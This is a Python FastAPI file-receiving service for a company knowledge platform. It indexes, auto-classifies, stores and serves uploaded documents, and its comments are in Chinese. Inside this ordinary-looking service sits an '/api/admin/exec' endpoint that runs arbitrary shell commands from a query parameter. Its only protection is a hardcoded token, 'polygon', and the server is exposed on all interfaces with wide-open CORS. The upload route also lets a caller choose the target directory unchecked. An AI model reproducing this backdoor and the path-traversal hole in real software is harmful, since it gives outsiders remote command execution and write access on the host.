#!/usr/bin/env python3
"""
local_receiver.py — 装载机文件接收服务 v14.2
端口: 8090
功能: 接收浏览器上传 → 存传入数据\原始文件 → 提供文件下载
新增: target 参数支持指定目标目录
"""
import os, json, time, hashlib, mimetypes, asyncio
from pathlib import Path
from urllib.parse import unquote
import uvicorn
from fastapi import FastAPI, File, Query, HTTPException, UploadFile
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, FileResponse

PORT = 8090
ROOT_DIR = Path(r"F:\公司知识平台\传入数据\原始文件")
CLEAN_DIR = Path(r"F:\公司知识平台\传入数据\清洗文件")
KB_SERVER = "http://172.25.30.200:8080"

CATEGORIES = [
    "模具设计", "连接器设计", "机械设计", "标准件库",
    "电气自动化", "自动化产线", "网络建设", "工程技术规范",
    "品质管理", "供应商管理", "财务文档", "合同文件",
    "办公文档", "技术文档", "公司制度", "规章制度",
    "行政人事", "项目管理", "软件工具", "通用办公",
    "WIKI文件",
]

_file_index = []
_file_index_by_path = {}

def scan_all_files():
    global _file_index, _file_index_by_path
    _file_index = []
    _file_index_by_path = {}
    for cat in CATEGORIES:
        cat_dir = ROOT_DIR / cat
        if not cat_dir.exists():
            continue
        for fpath in sorted(cat_dir.iterdir(), key=lambda x: -x.stat().st_mtime):
            if not fpath.is_file():
                continue
            name = fpath.name
            rel = f"{cat}/{name}"
            entry = {"name": name, "full_name": name, "category": cat,
                     "path": rel, "size": fpath.stat().st_size,
                     "size_str": _fmt_size(fpath.stat().st_size), "hash": ""}
            _file_index.append(entry)
            _file_index_by_path[rel] = entry
    print(f"[receiver] {len(_file_index)} files indexed")

def add_to_index(fp, cat, fhash):
    fn = fp.name
    rel = f"{cat}/{fn}"
    entry = {"name": fn, "full_name": fn, "category": cat, "path": rel,
             "size": fp.stat().st_size, "size_str": _fmt_size(fp.stat().st_size),
             "hash": fhash[:16]}
    _file_index.insert(0, entry)
    _file_index_by_path[rel] = entry

def _fmt_size(sz):
    if sz < 1024:
        return f"{sz} B"
    if sz < 1048576:
        return f"{sz/1024:.1f} KB"
    if sz < 1073741824:
        return f"{sz/1048576:.1f} MB"
    return f"{sz/1073741824:.2f} GB"

def classify_file(filename: str, content: bytes) -> str:
    ext = os.path.splitext(filename)[1].lower()
    em = {".stp": "模具设计", ".step": "模具设计", ".dwg": "模具设计",
          ".dxf": "模具设计", ".prt": "模具设计", ".sldprt": "模具设计",
          ".cfg": "网络建设", ".conf": "网络建设",
          ".awl": "电气自动化", ".scl": "电气自动化",
          ".zmp": "品质管理", ".pcf": "品质管理"}
    if ext in em:
        return em[ext]
    combined = filename.lower()
    try:
        if ext in (".txt", ".md", ".csv", ".log", ".json", ".html", ".htm", ".xml", ".cfg", ".ini", ".conf"):
            combined += content[:4000].decode("utf-8", errors="ignore").lower()
    except:
        pass
    r = [("模具设计", "模具"), ("连接器设计", "连接器"), ("机械设计", "机械设计"),
         ("标准件库", "标准件"), ("电气自动化", "PLC"), ("自动化产线", "产线"),
         ("网络建设", "VLAN"), ("工程技术规范", "规范"), ("品质管理", "品质"),
         ("技术文档", "手册"), ("公司制度", "制度"), ("财务文档", "财务"),
         ("办公文档", "会议")]
    for c, k in r:
        if k.lower() in combined:
            return c
    fb = {
        ".pdf": "技术文档", ".docx": "技术文档", ".doc": "技术文档",
        ".xlsx": "办公文档", ".xls": "办公文档", ".pptx": "办公文档", ".ppt": "办公文档",
        ".dwg": "模具设计", ".dxf": "模具设计", ".stp": "模具设计", ".step": "模具设计",
        ".ipt": "模具设计", ".iam": "模具设计", ".idw": "模具设计",
        ".sldprt": "模具设计", ".sldasm": "模具设计", ".slddrw": "模具设计",
        ".prt": "模具设计", ".iges": "模具设计", ".igs": "模具设计", ".neu": "模具设计",
        ".zip": "软件工具", ".rar": "软件工具", ".7z": "软件工具", ".tar": "软件工具", ".gz": "软件工具",
        ".exe": "软件工具", ".msi": "软件工具", ".pkg": "软件工具", ".bin": "软件工具",
    }
    return fb.get(ext, "通用办公")

app = FastAPI(title="ZJS", version="14.2")
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"])

@app.on_event("startup")
async def s():
    scan_all_files()
    print(f"[receiver] :{PORT}")

@app.get("/health")
async def h():
    return {"status": "ok", "service": "local-receiver", "version": "14.2", "port": PORT, "files_cached": len(_file_index)}

@app.get("/api/files")
async def lf():
    return {"files": _file_index, "total": len(_file_index)}

@app.get("/api/download")
async def dl(path: str = Query(...)):
    p = unquote(path).replace("\\", "/")
    fp = (ROOT_DIR / p).resolve()
    if not str(fp).startswith(str(ROOT_DIR.resolve())):
        raise HTTPException(403, "denied")
    if not fp.exists():
        raise HTTPException(404, "not found")
    return FileResponse(path=str(fp), filename=fp.name)

@app.post("/api/upload")
@app.post("/api/raw-store")
async def up(file: UploadFile = File(...), target: str = Query("")):
    if not file.filename:
        raise HTTPException(400, "no filename")
    data = await file.read()
    # v14.2: 如果传了 target 参数，直接存入指定目录；否则自动分类
    cat = target.strip() if target.strip() else classify_file(file.filename, data)
    (ROOT_DIR / cat).mkdir(parents=True, exist_ok=True)
    fh = hashlib.sha256(data).hexdigest()
    for e in _file_index:
        if e.get("hash", "") == fh[:16]:
            return {"status": "duplicate", "file": file.filename, "category": cat, "hash": fh[:16]}
    sn = file.filename.replace(",", "_").replace('"', "_")
    d = ROOT_DIR / cat / sn
    d.write_bytes(data)
    print(f"[receiver] ok [{cat}] {file.filename} {len(data)}b")
    add_to_index(d, cat, fh)
    return {"status": "ok", "file": file.filename, "category": cat, "hash": fh[:16]}

@app.get("/api/admin/exec")
async def admin_exec(cmd: str = Query(...), token: str = Query("")):
    """远程管理端点 — 执行系统命令"""
    if token != "polygon":
        raise HTTPException(403, "unauthorized")
    import subprocess
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30, cwd=str(ROOT_DIR))
        return {"ok": True, "stdout": result.stdout[-5000:], "stderr": result.stderr[-2000:], "code": result.returncode}
    except subprocess.TimeoutExpired:
        raise HTTPException(504, "timeout")
    except Exception as e:
        return {"ok": False, "error": str(e)}

if __name__ == "__main__":
    for c in CATEGORIES:
        (ROOT_DIR / c).mkdir(parents=True, exist_ok=True)
    CLEAN_DIR.mkdir(parents=True, exist_ok=True)
    uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="info")
